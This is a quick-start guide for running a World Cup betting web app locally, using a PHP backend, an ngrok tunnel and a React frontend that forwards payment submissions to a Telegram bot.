# 🚀 Start Everything - Quick Guide

This guide shows you how to run the complete World Cup Betting system locally using ngrok.

## Prerequisites

- Node.js installed
- PHP installed (PHP 7+)
- ngrok installed (see backend/NGROK_SETUP.md)

## 🎯 Quick Start (3 Terminals)

### Terminal 1️⃣ - Backend Server

```bash
cd world-cup/backend
php -S localhost:8000
```

Keep this running! You should see:
```
PHP Development Server (http://localhost:8000) started
```

---

### Terminal 2️⃣ - ngrok Tunnel

Open a NEW terminal:

```bash
ngrok http 8000
```

**IMPORTANT:** Copy the Forwarding URL from ngrok output:
```
Forwarding: https://abc123.ngrok-free.app -> http://localhost:8000
```

Example: `https://abc123.ngrok-free.app`

---

### Terminal 3️⃣ - Frontend (React App)

Open a NEW terminal:

```bash
cd world-cup
npm run dev
```

Your app will be at: http://localhost:2026

---

## ⚙️ Configuration Steps

### 1. Get Telegram Chat ID

1. Send message to bot: https://t.me/worldcupevidensbot
2. Visit: `https://YOUR-NGROK-URL/test-bot.php`
3. Copy your Chat ID

### 2. Update Backend Config

Edit `backend/config.php` line 3:
```php
define('TELEGRAM_CHAT_ID', '123456789'); // Your Chat ID here
```

### 3. Update Frontend API URL

Edit `src/pages/PaymentPage.tsx` line 12:
```typescript
const API_ENDPOINT = "https://YOUR-NGROK-URL/submit-payment.php";
```

Replace `YOUR-NGROK-URL` with the URL from ngrok (step 1 above).

### 4. Restart Frontend

After updating PaymentPage.tsx:
- Press `Ctrl+C` in Terminal 3
- Run `npm run dev` again

---

## ✅ Test It!

1. Go to http://localhost:2026
2. Select a country and place a bet
3. Enter phone number: `+251912345678`
4. Upload a test screenshot
5. Click "Confirm Payment"
6. Check your Telegram bot - you should receive the payment!

---

## 🔄 If ngrok URL Changes

When you restart ngrok, the URL changes. You need to:

1. Copy new ngrok URL from Terminal 2
2. Update `src/pages/PaymentPage.tsx` with new URL
3. Restart Terminal 3 (Ctrl+C then `npm run dev`)

---

## 🛑 Stop Everything

Press `Ctrl+C` in each terminal:
1. Terminal 1 (PHP Server)
2. Terminal 2 (ngrok)
3. Terminal 3 (React App)

---

## 📁 File Structure

```
world-cup/
├── backend/
│   ├── config.php              ← Update Chat ID here
│   ├── submit-payment.php      ← Main API
│   ├── test-bot.php           ← Test & get Chat ID
│   └── start-server.sh        ← Helper script
├── src/
│   └── pages/
│       └── PaymentPage.tsx    ← Update API URL here
└── START_EVERYTHING.md        ← This file
```

---

## 🆘 Common Issues

### Issue: "ngrok not found"
**Fix:** Install ngrok from https://ngrok.com/download

### Issue: Port 8000 already in use
**Fix:** Use different port:
```bash
# Terminal 1
php -S localhost:8001

# Terminal 2
ngrok http 8001
```

### Issue: Can't see Chat ID
**Fix:** 
1. Make sure you sent a message to the bot first
2. Wait 10 seconds and refresh test-bot.php

### Issue: Payment not sending
**Fix:**
1. Check `backend/debug.log` for errors
2. Verify Chat ID is configured
3. Test with test-bot.php first

---

## 🎉 Success!

When everything works, you'll see:
- ✅ Frontend running at http://localhost:2026
- ✅ Backend accessible via ngrok URL
- ✅ Payments forwarded to Telegram bot
- ✅ Screenshots received in Telegram

---

## 📞 Need Help?

1. Check `backend/debug.log` for detailed logs
2. Check browser console for frontend errors
3. Make sure all 3 terminals are running
4. Verify ngrok URL is updated in PaymentPage.tsx
